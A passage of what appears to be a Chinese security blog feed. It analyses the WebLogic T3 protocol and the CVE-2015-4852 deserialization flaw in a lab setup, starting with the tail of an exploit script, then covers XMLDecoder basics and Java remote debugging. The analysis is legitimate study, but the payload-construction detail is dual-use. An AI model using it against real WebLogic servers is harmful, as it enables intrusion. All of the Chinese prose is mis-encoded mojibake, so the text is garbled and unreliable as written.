get_payload1(gadget, command)<br><br>    exp(host, port, payload)<br></code></pre></td></tr></table></figure><p>æ‰“è¿‡å»ä¹‹åæˆ‘ä»¬å¯ä»¥æŠ“åˆ°è¿™æ ·çš„ä¸€ä¸ªæµé‡åŒ…</p><p><img src="https://cdn.clown2024.cn/image-20250409231358262.png" alt="image-20250409231358262"></p><p>T3åè®®çš„ç»“æ„åˆ†ä¸ºè¯·æ±‚å¤´å’Œè¯·æ±‚ä½“</p><p><strong>è¯·æ±‚å¤´</strong></p><p>è¯·æ±‚å¤´å°±æ˜¯ç¬¬ä¸€éƒ¨åˆ†çš„çº¢è‰²æ•°æ®ï¼Œå…ˆå’ŒæœåŠ¡ç«¯è¿›è¡Œä¸€æ¬¡handshake</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">t3 10.3.1<br>AS:255<br>HL:19<br>MS:10000000<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œä¸ºâ€œt3â€åŠ weblogicå®¢æˆ·ç«¯çš„ç‰ˆæœ¬å·</p><p>ç„¶åæœåŠ¡ç«¯å°±ä¼šè¿”å›ç›¸åº”çš„æ•°æ®</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">HELO:10.3.6.0.false<br>AS:2048<br>HL:19<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œä¸ºâ€œHELO:â€åŠ weblogicæœåŠ¡å™¨çš„ç‰ˆæœ¬å·</p><blockquote><p>æ‰€ä»¥è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨æ¥æ¢æµ‹æœåŠ¡ç«¯æ˜¯å¦å¼€æ”¾äº†T3åè®®ï¼Œæœ‰ä¸€æ¬¡é¢è¯•çš„æ—¶å€™è¢«é—®åˆ°äº†ï¼Œç»“æœä¸å¤ªæ¸…æ¥š</p></blockquote><p><strong>è¯·æ±‚ä½“</strong></p><p>ç„¶åå°±æ˜¯è¯·æ±‚ä½“çš„éƒ¨åˆ†äº†ï¼Œè¿™é‡Œå°±å¼•ç”¨z_zz_zzzå¸ˆå‚…çš„å›¾äº†ï¼š<a href="http://drops.xmd5.com/static/drops/web-13470.html">http://drops.xmd5.com/static/drops/web-13470.html</a></p><p><img src="https://cdn.clown2024.cn/image-20250409235802346.png" alt="image-20250409235802346"></p><p><img src="https://cdn.clown2024.cn/437dda72ddf4cda67306b11d5a13220080f99dd7.jpg" alt="pic"></p><p>é¦–å…ˆæ˜¯ç¬¬ä¸€éƒ¨åˆ†çš„æ•°æ®ï¼Œå‰å››ä¸ªå­—èŠ‚è¡¨ç¤ºçš„æ˜¯æ•´ä¸ªæ•°æ®åŒ…çš„é•¿åº¦ï¼Œæ¯”å¦‚å›¾ä¸­çš„(1711&#x3D;0x6AF)ï¼Œç„¶åè·Ÿç€å…¶ä½™çš„ä¸€äº›æ•°æ®</p><p>ä»ç¬¬äºŒéƒ¨åˆ†å¼€å§‹å°±æ˜¯javaçš„åºåˆ—åŒ–æ•°æ®äº†ï¼Œæ¯ä¸€éƒ¨åˆ†å¼€å¤´éƒ½æ˜¯<code>ac ed 00 05</code>ï¼Œè¡¨æ˜è¿™æ˜¯åºåˆ—åŒ–çš„å†…å®¹ï¼Œç„¶å<code>fe 01 00 00</code>æ˜¯ååºåˆ—åŒ–çš„æ ‡è¯†å¤´ï¼Œä»æ”»å‡»æµé‡ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20250410000643641.png" alt="image-20250410000643641"></p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ payloadçš„è¯ï¼Œå°±å¯ä»¥æ ¹æ®è¯¥æ ¼å¼ï¼Œå¯¹åºåˆ—åŒ–çš„å†…å®¹è¿›è¡Œæ›¿æ¢</p><p><img src="https://cdn.clown2024.cn/image-20250410001347941.png" alt="image-20250410001347941"></p><p>ä»expçš„å†™æ³•ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œéƒ½æ˜¯æŒ‰ç…§æ ¼å¼æ¥æ‹¼æ¥çš„</p><h1 id="cve-2015-4852åˆ†æ"><a href="#CVE-2015-4852åˆ†æ" class="headerlink" title="CVE-2015-4852åˆ†æ"></a>CVE-2015-4852åˆ†æ</h1><p>å‰é¢åè®®çš„æµé‡åˆ†æè¿‡äº†ï¼Œè¿™é‡Œå°±æŠŠè¿™ä¸ªcveçš„è§¦å‘æµç¨‹ä¹Ÿåˆ†æä¸€ä¸‹</p><h2 id="è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="è°ƒè¯•ç¯å¢ƒæ­å»º"></a>è°ƒè¯•ç¯å¢ƒæ­å»º</h2><p>æˆ‘ä»¬è¿™é‡Œç”¨çš„vulhubçš„2017çš„ç¯å¢ƒï¼Œæ˜¯æ²¡æœ‰å¼€å¯debugç¯å¢ƒçš„ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»å¼€ä¸€ä¸‹</p><p>è¿™é‡Œå…ˆä¿®æ”¹ä¸€ä¸‹vulhubçš„docker composeæ–‡ä»¶ï¼Œå¼€æ”¾ä¸€ä¸‹8453ç«¯å£ï¼Œå› ä¸º8453æ˜¯weblogicçš„è¿œç¨‹è°ƒè¯•ç«¯å£</p><p><img src="https://cdn.clown2024.cn/image-20250410130716455.png" alt="image-20250410130716455"></p><blockquote><p>è¿™ä¸ª5556æ˜¯Node Managerçš„é»˜è®¤ç›‘å¬ç«¯å£ã€‚Node Manageræ˜¯WebLogic Serverçš„ä¸€ä¸ªJavaç¨‹åºï¼Œç”¨äºå¯åŠ¨ã€å…³é—­å’Œç›‘æ§æœåŠ¡å™¨å®ä¾‹ã€‚</p></blockquote><p>ç„¶åæˆ‘ä»¬å¯ä»¥å‚è€ƒå¥‡å®‰ä¿¡å¤§å“¥çš„å®‰è£…è„šæœ¬é‡Œé¢çš„å¼€å¯debugæ¨¡å¼å»æ‰‹åŠ¨æ“ä½œä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20250410130904372.png" alt="image-20250410130904372"></p><p>åƒä¸‹é¢è¿™æ ·æ›´æ”¹ç„¶åé‡å¯å®¹å™¨å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20250410171029740.png" alt="image-20250410171029740"></p><p>ç„¶åæˆ‘ä»¬è¦æŠŠwlserver_10.3&#x2F;server&#x2F;libæ–‡ä»¶å¤¹æ‹‰å‡ºæ¥æ·»åŠ åˆ°åº“é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20250410170301760.png" alt="image-20250410170301760"></p><p>ç„¶åå†é…ç½®è¿œç¨‹è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/image-20250410170418983.png" alt="image-20250410170418983"></p><p>å¯åŠ¨ä¸€ä¸‹debug</p><p><img src="https://cdn.clown2024.cn/image-20250410171202544.png" alt="image-20250410171202544"></p><p>æˆåŠŸè¿æ¥</p><h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><p>T3åè®®æ¥å—çš„æ•°æ®ï¼Œæ˜¯åœ¨<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>è¿›è¡Œäº†ä¸€ä¸ªååºåˆ—åŒ–çš„æ“ä½œï¼Œé‡Œé¢è°ƒç”¨äº†<code>InboundMsgAbbrev.ServerChannelInputStream#readObject</code>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20250410180315180.png" alt="image-20250410180315180"></p><p>ç„¶åè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œå¹¶ä¸”è°ƒç”¨äº†readObjectæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹ServerChannelInputStreamçš„å®ç°</p><p><img src="https://cdn.clown2024.cn/image-20250410182506169.png" alt="image-20250410182506169"></p><p>è¿™é‡Œå¯¹resolveClassè¿›è¡Œäº†é‡å†™ï¼Œç›´æ¥è°ƒç”¨äº†çˆ¶ç±»çš„resolveClassï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œåé¢å°±æ¥ç€æ­£å¸¸çš„ååºåˆ—åŒ–æµç¨‹äº†ï¼Œè¿™å°±å¯¼è‡´äº†æ¼æ´çš„äº§ç”Ÿï¼Œç„¶åweblogicæœ¬èº«å¸¦äº†ccä¾èµ–ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“ccé“¾ï¼Œæˆ–è€…å…¶ä»–çš„ä¸€äº›gadget</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹ä¿®å¤æ˜¯å¢åŠ äº†é»‘åå•</p><p><img src="https://cdn.clown2024.cn/BlackList.png" alt="img"></p><p>æœ‰å…³WebLogicçš„å®˜æ–¹é€šå‘Šå’Œå®‰å…¨è¡¥ä¸å‘å¸ƒçš„ç½‘å€ï¼š<a href="https://www.oracle.com/security-alerts/">https://www.oracle.com/security-alerts/</a></p><p>è¿™ç§å•çº¯é»‘åå•çš„æ–¹å¼è‚¯å®šæ˜¯å®¹æ˜“è¢«ç»•è¿‡çš„ï¼Œåé¢å‡ºç°çš„cveå°±æœ‰ç›´æ¥æŠŠè¿™ä¸ªç»•äº†çš„</p><h1 id="xmldecoderç›¸å…³"><a href="#XMLDecoderç›¸å…³" class="headerlink" title="XMLDecoderç›¸å…³"></a>XMLDecoderç›¸å…³</h1><p>å› ä¸ºWebLogicçš„ååºåˆ—åŒ–æ¼æ´ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯å‰é¢çš„T3åè®®çš„ååºåˆ—åŒ–ï¼Œå¦ä¸€ç±»å°±æ˜¯XMLDecoderç›¸å…³çš„ååºåˆ—åŒ–æ¼æ´</p><p>æ‰€ä»¥è¿™é‡Œäº†è§£ä¸€ä¸‹XMLDecoderç›¸å…³çš„åŸºç¡€çŸ¥è¯†</p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>XMLï¼ˆExtensible Markup Languageï¼‰æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨XMLæ¥è¿›è¡Œæ•°æ®çš„ä¼ è¾“æˆ–å……å½“é…ç½®æ–‡ä»¶ã€‚é‚£ä¹ˆJavaä¸ºäº†å°†å¯¹è±¡æŒä¹…åŒ–ä»è€Œæ–¹ä¾¿ä¼ è¾“ï¼Œå°±ä½¿å¾—Philip Mineåœ¨JDK1.4ä¸­å¼€å‘äº†ä¸€ä¸ªç”¨ä½œæŒä¹…åŒ–çš„å·¥å…·ï¼ŒXMLDecoderä¸XMLEncoderã€‚</p><blockquote><p>JDK1.6å’ŒJDK1.7çš„Handlerå®ç°å‡æœ‰ä¸åŒ</p></blockquote><h2 id="xmlè§£æè¿‡ç¨‹"><a href="#xmlè§£æè¿‡ç¨‹" class="headerlink" title="xmlè§£æè¿‡ç¨‹"></a>xmlè§£æè¿‡ç¨‹</h2><p>è¿™éƒ¨åˆ†çš„è¯¦ç»†å†…å®¹å¯ä»¥çœ‹ä¸€ä¸‹<a href="https://paper.seebug.org/1012/">https://paper.seebug.org/1012/</a></p><p>javaä¸­æ˜¯æœ‰ä¸¤ä¸ªapiç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–xmlçš„ï¼ŒXMLEncoderå’ŒXMLDecoder</p><h3 id="xmldecoderä»‹ç»"><a href="#XMLDecoderä»‹ç»" class="headerlink" title="XMLDecoderä»‹ç»"></a>XMLDecoderä»‹ç»</h3><p>javaä¸­æä¾›äº†å‡ ç§ä¸åŒçš„xmlè§£ææ¨¡å‹</p><table><thead><tr><th align="left"><strong>è§£ææ¨¡å‹</strong></th><th align="left"><strong>ç‰¹ç‚¹</strong></th><th align="left"><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td align="left"><strong>DOM(Document Object Model)</strong></td><td align="left">åŸºäºæ ‘ç»“æ„çš„è§£æï¼Œå°†æ•´ä¸ª XML åŠ è½½åˆ°å†…å­˜ï¼Œå½“XMLæ•°æ®é‡å¾ˆå¤§çš„æ—¶å€™ï¼Œä¼šéå¸¸æ¶ˆè€—æ€§èƒ½ï¼Œå› ä¸ºéœ€è¦å¯¹æ ‘è¿›è¡Œéå†</td><td align="left">éœ€è¦é¢‘ç¹è¯»å†™æˆ–æ“ä½œ XML ç»“æ„</td></tr><tr><td align="left"><strong>SAX(Simple API for XML Parsing)</strong></td><td align="left">äº‹ä»¶é©±åŠ¨çš„æµå¼è§£æï¼Œé€è¡Œè¯»å–ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸ä¼šæœ‰æ€§èƒ½é—®é¢˜</td><td align="left">å¤„ç†å¤§å‹ XML æ–‡ä»¶ï¼Œä»…éœ€è¯»å–æ•°æ®</td></tr><tr><td align="left"><strong>StAX(Streaming API for XML)</strong></td><td align="left">æ¨æ‹‰å¼æµè§£æï¼Œæ”¯æŒè¿­ä»£å¼å¤„ç†ï¼ŒJDK1.4å¼€å§‹æ”¯æŒ</td><td align="left">é«˜æ•ˆè§£æï¼Œå…¼é¡¾æ€§èƒ½å’Œçµæ´»æ€§</td></tr></tbody></table><p>javaçš„XMLDecoderä½¿ç”¨çš„æ˜¯SAXè§£æè§„èŒƒã€‚</p><p><strong>SAX</strong></p><p>SAXæ˜¯ç®€å•XMLè®¿é—®æ¥å£ï¼Œæ˜¯ä¸€å¥—XMLè§£æè§„èŒƒï¼Œä½¿ç”¨äº‹ä»¶é©±åŠ¨çš„è®¾è®¡æ¨¡å¼ï¼Œé‚£ä¹ˆäº‹ä»¶é©±åŠ¨çš„è®¾è®¡æ¨¡å¼è‡ªç„¶å°±ä¼šæœ‰äº‹ä»¶æºå’Œäº‹ä»¶å¤„ç†å™¨ä»¥åŠç›¸å…³çš„æ³¨å†Œæ–¹æ³•å°†äº‹ä»¶æºå’Œäº‹ä»¶å¤„ç†å™¨è¿æ¥èµ·æ¥ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20250410232001780.png" alt="image-20250410232001780"></p><p>è¿™é‡Œé€šè¿‡JAXPçš„å·¥å‚æ–¹æ³•ç”ŸæˆSAXå¯¹è±¡ï¼ŒSAXå¯¹è±¡ä½¿ç”¨<code>SAXParser.parer()</code>ä½œä¸ºäº‹ä»¶æºï¼Œ<code>ContentHandler</code>ã€<code>ErrorHandler</code>ã€<code>DTDHandler</code>ã€<code>EntityResolver</code>ä½œä¸ºäº‹ä»¶å¤„ç†å™¨ï¼Œé€šè¿‡æ³¨å†Œæ–¹æ³•å°†äºŒè€…è¿æ¥èµ·æ¥ã€‚</p><p><strong>Apache Xerces</strong></p><p>Apache Xercesè§£æå™¨æ˜¯ä¸€å¥—ç”¨äºè§£æã€éªŒè¯ã€åºåˆ—åŒ–å’Œæ“ä½œXMLçš„è½¯ä»¶åº“é›†åˆï¼Œå®ƒå®ç°äº†å¾ˆå¤šè§£æè§„èŒƒï¼ŒåŒ…æ‹¬DOMå’ŒSAXè§„èŒƒï¼ŒJavaå®˜æ–¹åœ¨JDK1.5é›†æˆäº†è¯¥è§£æå™¨ï¼Œå¹¶ä½œä¸ºé»˜è®¤çš„XMLçš„è§£æå™¨ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://paper.seebug.org/1012/">https://paper.seebug.org/1012/</a></p><p>ç¯å¢ƒæ­å»ºï¼š<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p><a href="https://cmisl.github.io/2024/09/08/Weblogic/">https://cmisl.github.io/2024/09/08/Weblogic/</a></p><p><a href="http://drops.xmd5.com/static/drops/web-13470.html">http://drops.xmd5.com/static/drops/web-13470.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;p&gt;å®˜æ–¹ä»‹ç»ï¼šOracle WebLogic Server æ˜¯ä¸€ä¸ªç»Ÿä¸€çš„å¯æ‰©å±•å¹³å°ï¼Œä¸“ç”¨äºå¼€å‘ã€éƒ¨ç½²å’Œè¿è¡Œ Java åº”ç”¨ç­‰é€‚ç”¨äºæœ¬åœ°ç¯å¢ƒå’Œäº‘ç¯</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Javaè¿œç¨‹è°ƒè¯•</title>
    <link href="https://clowsman.github.io/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <id>https://clowsman.github.io/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</id>
    <published>2025-02-07T15:11:43.000Z</published>
    <updated>2025-02-09T13:40:38.869Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æƒ³çœ‹çœ‹weblogicï¼Œä½†æ˜¯ç¯å¢ƒæ¯”è¾ƒéš¾æ­å»ºå’Œè°ƒè¯•ï¼Œè¶ç€è¿™ä¸ªæœºä¼šï¼Œçœ‹ä¸€ä¸‹javaçš„å„ç§ä»£ç è¿œç¨‹è°ƒè¯•çš„æ–¹æ³•ï¼Œå¾ˆåŸºç¡€çš„ä¸œè¥¿äº†ï¼Œä¸€ç›´æ²¡çœ‹ã€‚(é¡ºä¾¿æ°´ä¸€ç¯‡åšå®¢)</p><h1 id="è¿œç¨‹è°ƒè¯•jaråŒ…"><a href="#è¿œç¨‹è°ƒè¯•JaråŒ…" class="headerlink" title="è¿œç¨‹è°ƒè¯•JaråŒ…"></a>è¿œç¨‹è°ƒè¯•JaråŒ…</h1><p>ä¸»è¦åœ¨åªæœ‰jaråŒ…æ— æºç çš„æƒ…å†µä¸‹è¿›è¡Œè°ƒè¯•ã€‚</p><p>è¿™é‡Œä»¥å†°èçš„jaråŒ…ä¸ºä¾‹å­</p><p>éšä¾¿å¼€ä¸€ä¸ªjavaé¡¹ç›®ï¼Œç„¶åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªlibç›®å½•ç„¶åæ”¾å…¥jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20250207232603675.png" alt="image-20250207232603675"></p><p>å³é”®é€‰æ‹©Add as Libraryï¼Œå°†libæ–‡ä»¶å¤¹æ·»åŠ è¿›é¡¹ç›®ä¾èµ–</p><p><img src="https://cdn.clown2024.cn/image-20250207232743226.png" alt="image-20250207232743226"></p><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°jaråŒ…ä¸­åç¼–è¯‘çš„æºä»£ç äº†</p><p><img src="https://cdn.clown2024.cn/image-20250207232819108.png" alt="image-20250207232819108"></p><p>ç„¶åæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªRemote JVM Debugçš„Configuration</p><p><img src="https://cdn.clown2024.cn/image-20250207233704447.png" alt="image-20250207233704447"></p><p>ç„¶åé»˜è®¤é…ç½®Applyæäº¤å¹¶ä¿å­˜å³å¯ï¼Œå…¶ä¸­<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>å°†ä½œä¸ºè¿è¡Œæ—¶çš„å¯åŠ¨å‚æ•°</p><p><img src="https://cdn.clown2024.cn/image-20250207233914498.png" alt="image-20250207233914498"></p><p>ç„¶åå°†<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>ä½œä¸ºå¯åŠ¨å‚æ•°è¿è¡ŒjaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20250207234243331.png" alt="image-20250207234243331"></p><blockquote><p>suspendè¡¨ç¤ºæ˜¯å¦æš‚åœç¨‹åºç­‰å¾…è°ƒè¯•å™¨è¿æ¥ï¼Œâ€yâ€è¡¨ç¤ºæš‚åœï¼Œâ€nâ€è¡¨ç¤ºä¸æš‚åœï¼Œè¿™é‡Œè¿˜æ˜¯è¦é€‰æ‹©æš‚åœï¼Œä¸Šé¢é»˜è®¤çš„æ˜¯ä¸æš‚åœå¯¼è‡´æˆ‘è°ƒè¯•è¿›å…¥ä¸åˆ°æ–­ç‚¹ï¼Œå› ä¸ºå®¹æ˜“ç¨‹åºæ‰§è¡Œè¿‡å¿«æ–­ç‚¹æ‹¦æˆªä¸åˆ°</p></blockquote><p>å‘ƒå‘ƒä½†æ˜¯è¿˜æ˜¯ä¸æˆåŠŸï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåæ¥æ‰¾åˆ°ä¸€ç¯‡çœ‹é›ªçš„æ–‡ç« ï¼š<a href="https://bbs.kanxue.com/thread-282397.htm%EF%BC%8C%E8%AF%B4%E6%98%AF%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8%E7%BC%96%E8%AF%91%E7%9A%84%E6%97%B6%E5%80%99%E5%8E%BB%E6%8E%89%E4%BA%86%E8%B0%83%E8%AF%95%E7%AC%A6%E5%8F%B7%EF%BC%8C%E5%9C%A8%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%AF%B9%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%87%BD%E6%95%B0%E4%BD%93%E5%86%85%E7%9A%84%E5%9C%B0%E6%96%B9%E4%B8%8B%E6%96%AD%E7%82%B9%E5%A4%B1%E6%95%88%EF%BC%8C%E5%8F%AA%E6%9C%89%E5%AF%B9%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%8B%E6%96%AD%E7%82%B9%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%9A%84%E3%80%82">https://bbs.kanxue.com/thread-282397.htmï¼Œè¯´æ˜¯ç¬¦å·è¡¨çš„åŸå› ï¼Œå› ä¸ºåœ¨ç¼–è¯‘çš„æ—¶å€™å»æ‰äº†è°ƒè¯•ç¬¦å·ï¼Œåœ¨æ²¡æœ‰ç¬¦å·çš„æƒ…å†µä¸‹ï¼Œå¯¹ä¸šåŠ¡ä»£ç å‡½æ•°ä½“å†…çš„åœ°æ–¹ä¸‹æ–­ç‚¹å¤±æ•ˆï¼Œåªæœ‰å¯¹ç³»ç»Ÿå‡½æ•°çš„ä»£ç ä¸‹æ–­ç‚¹æ˜¯å¯ä»¥çš„ã€‚</a></p><p>é‚£è¿™é‡Œå†é‡æ–°å†™ä¸€ä¸ªç®€å•çš„å¾ªç¯æ‰“å°çš„demoæ¥è¯•ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20250209164358801.png" alt="image-20250209164358801"></p><p><strong>å»æ‰è°ƒè¯•ç¬¦å·</strong></p><p>è¦å»æ‰è°ƒè¯•ç¬¦å·çš„è¯ç¼–è¯‘æ—¶åŠ ä¸Š<code>-g:none</code>å³å¯</p><h2 id="jaræ‰“åŒ…"><a href="#jaræ‰“åŒ…" class="headerlink" title="jaræ‰“åŒ…"></a>jaræ‰“åŒ…</h2><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°æ’æ›²ï¼Œæˆ‘ä¸€å¼€å§‹æ‰“åŒ…å®Œä¹‹åè¿è¡Œä¼šè¯´æ²¡æœ‰ä¸»å±æ€§æ¸…å•ï¼Œæˆ‘ä¸€çœ‹mfæ–‡ä»¶ï¼Œæ ¹æœ¬æ²¡æœ‰æŒ‡å®šMain-Classï¼Œç„¶åè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªæ‰“åŒ…æ’ä»¶æ¥ç”Ÿæˆï¼Œè®°å½•ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><span class="hljs-comment">&lt;!--ä¿®æ”¹ç¼–è¯‘å‡ºæ¥çš„jaråŒ…åï¼Œä»…ä¸º&#123;artifactId&#125;.jar--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>org.clown.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span> <span class="hljs-comment">&lt;!-- æ­¤å¤„ä¸ºä¸»å…¥å£--&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†æ‰“åŒ…å°±è¡Œäº†</p><p>ç„¶åå†æŒ‰å‰é¢çš„æ–¹å¼å¯åŠ¨å°±å¯ä»¥æ‰“åˆ°æ–­ç‚¹äº†</p><p><img src="https://cdn.clown2024.cn/image-20250209165226194.png" alt="image-20250209165226194"></p><p>é‚£çœ‹æ¥å‰é¢å¤±è´¥çš„åŸå› å°±æ˜¯å› ä¸ºæ²¡æœ‰ç¬¦å·è¡¨çš„é—®é¢˜äº†</p><p>ç„¶åå‰é¢ä¸šåŠ¡ä»£ç æ–­ä¸äº†ç‚¹ï¼Œä½†æ˜¯å¯ä»¥åœ¨å‡½æ•°åçš„åœ°æ–¹æ–­ç‚¹ï¼Œè¿™é‡Œéšä¾¿æ‹¿äº†ä¸€ä¸ªç®€å•çš„webåº”ç”¨æ¥å°è¯•</p><p><img src="https://cdn.clown2024.cn/image-20250209165724961.png" alt="image-20250209165724961"></p><p>ç„¶åä»–å°±ä¼šè¿›åˆ°ç³»ç»Ÿå‡½æ•°é‡Œé¢äº†ï¼Œæ‰€ä»¥æ²¡æœ‰æºç è¿˜æ˜¯æ¯”è¾ƒä¸æ–¹ä¾¿</p><h1 id="æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•"><a href="#æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•" class="headerlink" title="æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•"></a>æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•</h1><p>æ“ä½œå’Œå‰é¢çš„ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯æœ¬åœ°ç”¨çš„æ˜¯æºç ã€‚</p><p>æ€»ä¹‹æœ‰æºç å°½é‡ç”¨æºç è°ƒè¯•ã€‚</p><h1 id="è¿œç¨‹è°ƒè¯•docker"><a href="#è¿œç¨‹è°ƒè¯•Docker" class="headerlink" title="è¿œç¨‹è°ƒè¯•Docker"></a>è¿œç¨‹è°ƒè¯•Docker</h1><p>è¿™é‡Œå¯ä»¥çœ‹çœ‹pç¥çš„è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1bb421n7M2/?vd_source=f056182291458f597ae69cee19ecf116">https://www.bilibili.com/video/BV1bb421n7M2/?vd_source=f056182291458f597ae69cee19ecf116</a></p><p>å…¶å®åŸç†ä¹Ÿä¸€æ ·ï¼Œåªè¦æ˜ å°„ç«¯å£å‡ºæ¥ï¼Œç„¶åæœ¬åœ°æ”¾ä¸€ä¸ªç‰ˆæœ¬ä¸€æ ·çš„jaråŒ…æˆ–è€…æºç å³å¯ï¼Œå°±ä¸å†è®°å½•äº†ã€‚</p><h1 id="weblogicç¯å¢ƒæ­å»º"><a href="#Weblogicç¯å¢ƒæ­å»º" class="headerlink" 